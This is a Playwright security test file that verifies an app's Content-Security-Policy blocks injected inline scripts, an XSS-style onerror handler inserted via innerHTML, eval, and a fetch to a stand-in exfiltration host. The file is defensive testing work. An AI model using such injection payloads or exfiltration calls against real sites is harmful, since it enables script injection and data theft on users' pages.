import { expect, test, type BrowserContext, type Page } from '@playwright/test'
import { appCsp } from '../../../server/csp.mjs'
import { ServerHarness } from './harness'

// SEC-D-03: the app document carries a Content-Security-Policy, served by dojo-server (the server the Mac app runs),
// and Chromium enforces it: an injected inline script or inline handler does not run, eval is refused, and a fetch
// to another origin never leaves. This server has no report sink, so these deliberate violations stay out of a
// run's DOJO_CSP_REPORT_FILE.
let srv: ServerHarness
let ctx: BrowserContext | null = null
test.beforeEach(async () => { srv = new ServerHarness(undefined, { DOJO_CSP_REPORT_FILE: '' }); await srv.start() })
test.afterEach(async () => { await ctx?.close(); ctx = null; await srv.dispose() })

type Win = Window & { __inline?: number; __handler?: number; __violations?: string[] }
const read = (page: Page) => page.evaluate(() => {
  const w = window as Win
  return { inline: w.__inline, handler: w.__handler, violations: [...(w.__violations ?? [])] }
})

test('SEC-D-03: the app is served with its CSP, and an injected inline script, handler, eval or exfiltration is blocked', async ({ browser }) => {
  ctx = await browser.newContext({ baseURL: srv.url })
  await srv.makeWriter(ctx)
  const page = await ctx.newPage()
  const res = await page.goto('/')
  const csp = res?.headers()['content-security-policy']
  expect(csp).toBe(appCsp())
  expect(csp).toContain("script-src 'self';")
  expect(csp).toContain("connect-src 'self';")
  expect(csp).toContain("object-src 'none'")
  expect(csp).toContain("frame-ancestors 'none'")
  // the app itself runs under it (its bundle is an external module script)
  await expect(page.getByLabel('Start date')).toBeVisible()

  await page.evaluate(() => {
    const w = window as Win
    w.__violations = []
    document.addEventListener('securitypolicyviolation', e => { w.__violations!.push(e.effectiveDirective) })
  })
  // an inline <script> added to the document
  await page.evaluate(() => {
    const s = document.createElement('script')
    s.textContent = 'window.__inline = 1'
    document.head.appendChild(s)
  })
  // an inline handler built by innerHTML inside a shadow root (the SEC-D-01 sink's shape)
  await page.evaluate(() => {
    const d = document.createElement('div')
    d.attachShadow({ mode: 'open' }).innerHTML = '<img src="x-missing.png" onerror="window.__handler=1">'
    document.body.appendChild(d)
  })
  // eval (from a page task: DevTools' own evaluate is exempt from the eval check), and a fetch to another origin
  // (blocked before any network: connect-src 'self')
  const evalOutcome = await page.evaluate(() => new Promise<string>(resolve => setTimeout(() => {
    try { resolve(String((0, eval)('1 + 1'))) } catch (e) { resolve((e as Error).name) }
  }, 0)))
  const fetchOutcome = await page.evaluate(() => fetch('https://exfil.example.invalid/x').then(() => 'sent', e => (e as Error).name))
  expect(evalOutcome).toBe('EvalError')
  expect(fetchOutcome).toBe('TypeError')

  await expect.poll(async () => (await read(page)).violations.sort()).toEqual(
    expect.arrayContaining(['connect-src', 'script-src', 'script-src-attr', 'script-src-elem']),
  )
  const after = await read(page)
  expect(after.inline).toBeUndefined()
  expect(after.handler).toBeUndefined()
  await expect(page.getByLabel('Start date')).toBeVisible() // the app still works
})

test('SEC-D-03: the Python runner frame keeps its own policy (not the app\'s)', async ({ browser }) => {
  ctx = await browser.newContext({ baseURL: srv.url })
  const page = await ctx.newPage()
  const res = await page.request.get('/pyrunner/frame.html')
  const csp = res.headers()['content-security-policy']
  expect(csp).toContain("default-src 'none'")
  expect(csp).toContain("'wasm-unsafe-eval'")
  expect(csp).not.toBe(appCsp())
})
